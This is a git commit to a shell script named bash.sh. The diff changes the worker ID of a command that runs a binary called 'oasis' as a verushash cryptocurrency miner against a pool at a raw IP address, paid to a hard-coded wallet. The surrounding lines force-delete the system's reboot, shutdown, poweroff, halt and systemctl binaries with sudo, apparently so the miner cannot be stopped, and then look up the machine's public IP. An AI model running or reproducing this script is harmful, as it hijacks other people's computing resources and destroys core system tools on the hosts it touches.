81fd81899450c42fdc39c87a5f3533ef90c96761
weralopera <weralopera@outlook.com>
2024-12-30 23:49:51 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -11,7 +11,7 @@ for dir in $CPUFREQ_PATH; do
 done
 
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-HM --password x --cpu-threads 8
+./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.BRH4 --password x --cpu-threads 8
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
